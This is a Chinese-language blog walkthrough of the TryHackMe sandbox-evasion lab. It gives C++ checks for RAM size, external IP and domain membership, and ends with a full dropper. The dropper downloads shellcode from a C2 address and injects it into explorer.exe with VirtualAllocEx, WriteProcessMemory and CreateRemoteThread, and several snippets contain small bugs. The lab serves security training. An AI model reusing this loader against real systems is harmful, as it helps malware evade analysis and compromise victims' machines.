<p>现在我们已经完成了第二个沙盒规避技术，了解这是威胁行为者使用的极其常见的 TTP 非常重要。 APT 和红队都经常使用服务来检查 IP 地址的“滥用信息”，以收集有关 IP 地址的信息，以确定其是否是合法公司。 <a target="_blank" rel="noopener" href="https://app.any.run/">Any.Run</a>非常了解这种反沙盒技术，甚至在我们的实例中对其进行了标记。您可以在以下链接中查看详细结果：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a">One with an IP Address Filter</a></li>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085">One without an IP Address Filter</a></li>
</ul>
<p>查看这两个结果，我们可以看到 <a target="_blank" rel="noopener" href="http://ifconfig.me">ifconfig.me</a> 被标记为“可疑/潜在恶意”站点，用于检查您的外部 IP 地址。事实上，这种沙盒规避方法最终损害了我们的分数，因此它应该用作最后的手段<em>或</em>与最近部署/自定义 IP 地址检查服务器一起使用。完整的报告可以<a target="_blank" rel="noopener" href="https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a">在这里找到</a>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035211.png" alt="image-20240821184301834"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035212.png" alt="image-20240821184309089"></p>
<p>正如您现在所知，并非所有沙箱转义技术在某些情况下都可能有帮助；您必须仔细挑选要实施的规避技术，因为有些技术可能弊大于利。</p>
<h2 id="查看系统信息">查看系统信息</h2>
<p>我们将从系统信息类别开始 - 系统拥有的RAM量。请务必注意，Windows 以非标准格式测量数据。如果你曾经购买过一台声称拥有“256GB SSD 存储空间”的电脑，那么在打开它之后，你的存储空间将接近 240GB。这是因为 Windows 以 1024 字节为单位而不是 1000 字节来测量数据。请注意，这很快就会变得非常混乱。对我们来说幸运的是，我们将在如此少量的内存中工作，以至于准确性可以是“最佳猜测”而不是确切的数字。现在我们知道了这一点，我们如何确定系统上安装了多少内存？</p>
<h3 id="检查系统内存">检查系统内存</h3>
<p>幸运的是，这是一个相对容易发现的事情。我们只需要包含 Windows 头文件，就可以调用特定的 Windows API <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex">GlobalMemoryStatusEx</a>来为我们检索数据。要获取此信息，我们必须声明<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex">MEMORYSTATUSEX</a>结构；然后，我们必须将 dwLength 成员的大小设置为结构的大小。完成后，我们可以调用 GlobalMemoryStatusEx Windows API以使用内存信息填充该结构。</p>
<p>在这种情况下，我们对系统上安装的物理内存总量特别感兴趣，因此我们将打印 MEMORYSTATUSEX 结构体的 ullTotalPhys 成员，以获取系统中安装的内存大小（以字节为单位）。然后，我们可以除以 1024 3x 以获得安装的内存值（以 GiB 为单位）。现在让我们看看这在 C++ 中是什么样子的：</p>
<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
<span class="hljs-comment">// Declare the MEMORYSTATUSEX Struct    </span>
   MEMORYSTATUSEX statex;
<span class="hljs-comment">// Set the length of the struct to the size of the struct    </span>
   statex.dwLength = <span class="hljs-built_in">sizeof</span>(statex);
<span class="hljs-comment">// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    </span>
   <span class="hljs-built_in">GlobalMemoryStatusEx</span>(&amp;statex);
<span class="hljs-comment">// Print the physical memory installed on the system    </span>
   cout &lt;&lt; <span class="hljs-string">"There is "</span> &lt;&lt; statex.ullTotalPhys/<span class="hljs-number">1024</span>/<span class="hljs-number">1024</span>/<span class="hljs-number">1024</span> &lt;&lt; <span class="hljs-string">"GiB of memory on the system."</span>;
} 
This code can be broken down into the following steps:We<span class="hljs-number">'</span>re going to declare the MEMORYSTATUSEX Struct; <span class="hljs-keyword">this</span> will be populated with info from the GlobalMemoryStatusEx WinAPI.Now, we must set the length of the <span class="hljs-keyword">struct</span> <span class="hljs-title class_">so</span> that we can populate it with data. To <span class="hljs-keyword">do</span> so, we<span class="hljs-number">'</span>re going to use the <span class="hljs-keyword">sizeof</span> function.Now that we have the length of the <span class="hljs-keyword">struct</span>, we can populate it with data from the GlobalMemoryStatusEx WinAPI.We can now read the total memory amount from the system.</code></pre>
<p><strong>将其集成到我们的代码中</strong></p>
<p>现在我们已经掌握了技术知识，我们应该将此检查集成到我们的代码中。一般来说（您应该自己验证这一点），大多数沙箱都有4GB专用于机器的RAM，因此我们应该检查内存数是否大于5；如果不是，则退出程序；如果是，则继续执行。我们将不再修改 downloadAndExecute 函数；从现在开始，我们将添加新功能并更改主要功能。</p>
<pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">memoryCheck</span><span class="hljs-params">()</span> </span>{
<span class="hljs-comment">// This function will check and see if the system has 5+GB of RAM</span>
<span class="hljs-comment">// Declare the MEMORYSTATUSEX Struct    </span>
    MEMORYSTATUSEX statex;
<span class="hljs-comment">// Set the length of the struct to the size of the struct    </span>
    statex.dwLength = <span class="hljs-built_in">sizeof</span>(statex);
<span class="hljs-comment">// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    </span>
    <span class="hljs-built_in">GlobalMemoryStatusEx</span>(&amp;statex);
<span class="hljs-comment">// Checks if the System Memory is greater than 5.00GB    </span>
    <span class="hljs-keyword">if</span> (statex.ullTotalPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &gt;= <span class="hljs-number">5.00</span>) {        
       <span class="hljs-keyword">return</span> TRUE;    
    } <span class="hljs-keyword">else</span> {        
       <span class="hljs-keyword">return</span> FALSE;
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
<span class="hljs-comment">// Evaluates if the installed RAM amount is greater than 5.00 GB,</span>
<span class="hljs-comment">//if true download Shellcode, if false, exit the program.    </span>
<span class="hljs-keyword">if</span> (<span class="hljs-built_in">memoryCheck</span>() == TRUE) {        
    <span class="hljs-built_in">downloadAndExecute</span>();    
    } <span class="hljs-keyword">else</span> {        
       exit;    
    }
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>该代码可以分为以下步骤：</p>
<ol>
<li>我们正在创建一个新函数（memoryCheck），它将返回 True 或 False。</li>
<li>我们使用上面的代码来获取系统内存的大小。</li>
<li>我们检查系统内存是否大于5GB；如果为真，我们返回 TRUE；如果为假，我们返回FALSE。</li>
<li>函数返回的值决定我们是否下载并执行阶段 2。</li>
</ol>
<p><strong>测试我们的代码</strong></p>
<p>现在我们已经完成了第三种沙盒规避方法中的第二种，重要的是我们对其进行测试以确保其有效。为此，我们将文件上传到<a target="_blank" rel="noopener" href="http://any.run/">Any.Run</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/e2f6a64b-02ef-43ca-bea5-e724b234001c">One with the Memory Check function</a></li>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/7d06fc67-35c9-45f5-8865-af9dd6486075">One without the Memory Check function</a></li>
</ul>
<p>排查两个样本会发现一些有趣的差异；在第一次提交中，我们的内存检查功能工作正常，没有任何问题，并在发现设备的RAM小于 5GB 时优雅地退出程序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035213.png" alt="image-20240821184705140"></p>
<p>在我们未经修改的原始代码中，我们可以看到HTTP GET 请求发送到AWS Web 服务器以获取第二阶段。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035214.png" alt="image-20240821184752312"></p>
<p>这表明我们的代码按预期运行！现在，我们可以继续讨论最后的绕过类别之一 - 查询网络信息。</p>
<h2 id="查询网络信息">查询网络信息</h2>
<p>对于我们的最后一种规避技术，我们将查询有关 Active Directory 域的信息。我们将通过使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname">NetGetDCName</a> Windows API 查询域控制器的名称来保持简单。这是一个相对简单的 Windows API，用于获取环境中的主域控制器。这要求我们指定一个指向要放入的DC名称的字符串的指针。在 C++ 中实现该函数如下所示：</p>
<pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">isDomainController</span><span class="hljs-params">()</span></span>{
<span class="hljs-comment">// Create a long pointer to Wide String for our DC Name to live in</span>
    LPCWSTR dcName;  
<span class="hljs-comment">// Query the NetGetDCName Win32 API for the Domain Controller Name</span>
    <span class="hljs-built_in">NetGetDCName</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPBYTE *) &amp;dcName);
<span class="hljs-comment">// Convert the DCName from a Wide String to a String</span>
    <span class="hljs-function">wstring <span class="hljs-title">ws</span><span class="hljs-params">(dcName)</span></span>;
    <span class="hljs-function">string <span class="hljs-title">dcNewName</span><span class="hljs-params">(ws.begin(), ws.end())</span></span>;
<span class="hljs-comment">// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.</span>
    <span class="hljs-keyword">if</span> ( dcNewName.<span class="hljs-built_in">find</span>(<span class="hljs-string">"\\\\"</span>){
          <span class="hljs-keyword">return</span> TRUE;
    } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">return</span> FALSE;
    }
}</code></pre>
<p>该代码可以分为以下步骤：</p>
<ol>
<li>声明两个变量；一个字符串，一个 LPCWSTR。 NetGetDCName WinAPI 仅返回 LPCWSTR。</li>
<li>调用 NetGetDCName Windows API 。将指定两个空值，因为我们不知道我们可能所处环境的服务器名称或域名</li>
<li>我们将 LPCWSTR 转换为普通字符串变量以检查该值是否为 NULL（或者，如果是字符串，则为“”）。</li>
<li>执行比较语句并根据设备名称返回 True 或 False。</li>
</ol>
<p>然后，这将回调 Main() 函数，该函数将评估是否需要从C2服务器下载并执行我们的 shellcode。 Main 函数现在看起来像这样：</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (isDomainController == TRUE) {
        <span class="hljs-built_in">downloadAndExecute</span>();
    } <span class="hljs-keyword">else</span> {
        cout &lt;&lt; <span class="hljs-string">"Domain Controller Not Found!"</span>;
    }
}</code></pre>
<p><strong>测试我们的代码</strong></p>
<p>对于我们最后的沙盒分析，我们将使用 VirusTotal。查看 SysInternals Sandbox 的结果，我们可以看到我们的 Sandbox 规避技术有效。未向 Cloudflare 发出出站请求。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035215.png" alt="image-20240821185111188"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035216.png" alt="image-20240821185126439"></p>
<h2 id="visual-studio-中添加外部依赖项">Visual Studio 中添加外部依赖项</h2>
<p>对于最终的规避方法，我们必须在项目文件中添加一个新的DLL。为此，请确保首先打开您的项目。打开后，在“解决方案资源管理器”中右键单击项目名称。在下图中，项目名称称为“Console Application2”：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035217.png" alt="image-20240821185633915"></p>
<p>单击列表底部的“属性”；这将打开一个新的视野。展开“链接器”选项卡并选择“输入”子菜单。我们有兴趣添加 Netapi32 库。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035218.png" alt="image-20240821185642496"></p>
<p>为此，请单击右侧引用的所有库并添加 Netapi32.lib。添加后（如上面的屏幕截图所示），按“应用”按钮和“确定”关闭窗口，您就可以继续开发了！</p>
<h2 id="总结实施">总结实施</h2>
<p>现在您已经更熟悉了各种沙盒规避技术的实施，我们将在下一个任务中继续进行沙盒规避挑战。您将需要将多个旁路集成在一起以逃避“自定义”TryHackMe 沙箱。所有源代码均已完整提供，以帮助那些可能不熟悉 C++ 的人。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035219.png" alt="image-20240821185755872"></p>
<h1 id="0x05-diy-沙箱规避挑战">0x05 DIY 沙箱规避挑战</h1>
<h2 id="大逃亡">大逃亡</h2>
<p>现在您已经获得了一些逃离沙盒的经验，是时候接受挑战了！在本任务中，您将利用任务 4 中的代码来实现“终极沙盒逃避”方法来逃避 TryHackMe 的沙盒程序！为了逃离沙盒，您必须实施以下技术：</p>
<ul>
<li>检查设备是否已加入 Active Directory 域</li>
<li>检查系统内存是否大于1GB RAM</li>
<li>实施到 10.10.10.10 的出站HTTP请求</li>
<li>在从 Web 服务器检索负载之前实施 60 秒睡眠计时器</li>
</ul>
<p>如果您的滴管满足上述要求，则会向您打印该标志。</p>
<p>祝你好运，玩得开心！</p>
<p>提醒一下，任务 4 包含四个示例中的可下载源代码，可以帮助您使用沙盒规避技术。此材料也可以在虚拟机上的 C:\Users\Administrator\Desktop\Materials 中找到*.*</p>
<p><em>沙盒规避技术<strong>可能会</strong>失败。该程序分析二进制文件以查看是否执行了检查。出站设备可能无法访问互联网 - 只要执行检查，沙箱检查就应该成功。</em></p>
<h2 id="沙盒规避二进制文件">沙盒规避二进制文件</h2>
<p>当您完成payload的开发并准备好测试您的规避方法时，您可以在<code>C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe</code>中找到二进制文件来检查您的植入程序。下面是一个向您展示该程序如何工作的示例：</p>
<pre><code class="hljs scss">C:\Users\Administrator\Desktop\Materials\&gt; .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag:</code></pre>
<p>回答以下问题</p>
<p>使用任务中的代码片段和虚拟机作为参考，创建您自己的沙盒规避可执行文件。</p>
<p>在命令提示符下运行“SandboxChecker.exe”（上面的示例），提供可执行文件作为参数。所有检查必须正确执行才能显示标志。</p>
<p><strong>注意：<strong>如果您做得正确，“睡眠检查”将需要大约</strong>一分钟的时间才能显示</strong>该标志。</p>
<p>**注意：**如果您的 DNS 检查有<code>if(dcNewName.find("\\"))</code> 而不是<code>if(dcNewName.find("\\\\"))</code>那么您的睡眠检查可能会遇到困难。</p>
<p>最终文件代码为</p>
<pre><code class="hljs CPP"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;locale&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;urlmon.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;lm.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;DsGetDC.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"urlmon.lib"</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"netapi32.lib"</span>)</span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function">BOOL <span class="hljs-title">memoryCheck</span><span class="hljs-params">()</span> </span>{
    MEMORYSTATUSEX statex;
    statex.dwLength = <span class="hljs-built_in">sizeof</span>(statex);
    <span class="hljs-built_in">GlobalMemoryStatusEx</span>(&amp;statex);
    <span class="hljs-keyword">if</span> (statex.ullTotalPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &gt;= <span class="hljs-number">1.00</span>) {
        <span class="hljs-keyword">return</span> TRUE;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> FALSE;
    }
}

<span class="hljs-function">BOOL <span class="hljs-title">checkIP</span><span class="hljs-params">()</span> </span>
<span class="hljs-function"></span>{
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* websiteURL = <span class="hljs-string">"https://10.10.10.10/"</span>;
    IStream* stream;
    string s;
    <span class="hljs-type">char</span> buff[<span class="hljs-number">35</span>];
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytesRead;
    <span class="hljs-built_in">URLOpenBlockingStreamA</span>(<span class="hljs-number">0</span>, websiteURL, &amp;stream, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        stream-&gt;<span class="hljs-built_in">Read</span>(buff, <span class="hljs-number">35</span>, &amp;bytesRead);
        <span class="hljs-keyword">if</span> (<span class="hljs-number">0U</span> == bytesRead) {
            <span class="hljs-keyword">break</span>;
        }
        s.<span class="hljs-built_in">append</span>(buff, bytesRead);
    }
    <span class="hljs-keyword">if</span> (s == <span class="hljs-string">"VICTIM_IP"</span>) {
        <span class="hljs-keyword">return</span> TRUE;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> FALSE;
    }   
}

<span class="hljs-function">BOOL <span class="hljs-title">isDomainController</span><span class="hljs-params">()</span> </span>{
    LPCWSTR dcName;
    string dcNameComp;
    <span class="hljs-built_in">NetGetDCName</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPBYTE*)&amp;dcName);
    <span class="hljs-function">wstring <span class="hljs-title">ws</span><span class="hljs-params">(dcName)</span></span>;
    <span class="hljs-function">string <span class="hljs-title">dcNewName</span><span class="hljs-params">(ws.begin(), ws.end())</span></span>;
    cout &lt;&lt; dcNewName;
    <span class="hljs-keyword">if</span>(dcNewName.<span class="hljs-built_in">find</span>(<span class="hljs-string">"\\\\"</span>)) {
        <span class="hljs-keyword">return</span> FALSE;
        
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> TRUE;
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">downloadAndExecute</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
    HANDLE hProcess;
<span class="hljs-comment">//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes</span>
    SIZE_T dwSize = <span class="hljs-number">510</span>;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
<span class="hljs-comment">//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager</span>
    hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="hljs-number">4864</span>);
<span class="hljs-comment">//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* c2URL = <span class="hljs-string">"http://10.14.79.125:82/index.raw"</span>;
    IStream* stream;
<span class="hljs-comment">//Update the buff[] variable to include your shellcode size</span>
    <span class="hljs-type">char</span> buff[<span class="hljs-number">510</span>];
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytesRead;
    string s;
    <span class="hljs-built_in">URLOpenBlockingStreamA</span>(<span class="hljs-number">0</span>, c2URL, &amp;stream, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
<span class="hljs-comment">//Update the Read file descriptor to include your shellcode size</span>
        stream-&gt;<span class="hljs-built_in">Read</span>(buff, <span class="hljs-number">510</span>, &amp;bytesRead);
        <span class="hljs-keyword">if</span> (<span class="hljs-number">0U</span> == bytesRead) {
            <span class="hljs-keyword">break</span>;
        }
        s.<span class="hljs-built_in">append</span>(buff, bytesRead);
    }
    memAddr = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwSize, flAllocationType, flProtect);

    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, memAddr, buff, dwSize, &amp;bytesOut);

    <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, dwSize, (LPTHREAD_START_ROUTINE)memAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    stream-&gt;<span class="hljs-built_in">Release</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
	<span class="hljs-built_in">sleep</span>(<span class="hljs-number">4000</span>);
	
	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">memoryCheck</span>() == TRUE) {
		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">checkIP</span>() == TRUE) {
			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isDomainController</span>() == TRUE) {
				<span class="hljs-built_in">downloadAndExecute</span>();
			}
		}
	}
	
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035220.png" alt="image-20240821203322448"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035221.png" alt="image-20240821203331676"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035222.png" alt="image-20240821203354493"></p>
<h1 id="0x06-总结">0x06 总结</h1>
<p>在这个房间中，我们介绍了一些现代和历史上的沙盒规避技术，这些技术已被红队成员和高级威胁行为者所使用。完成这个房间后，您现在应该大致了解什么是恶意软件沙箱、可以尝试用来规避它的方法，甚至是可以构建的一些模板代码。</p>
<p>这绝不是所有沙盒规避方法的完整列表；我们强烈鼓励您利用从这个房间学到的基础知识来开发自己的沙盒规避技术。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/')">THM-沙盒规避</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-沙盒规避&amp;url=http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/08/21/thm-fang-huo-qiang/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-防火墙</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days 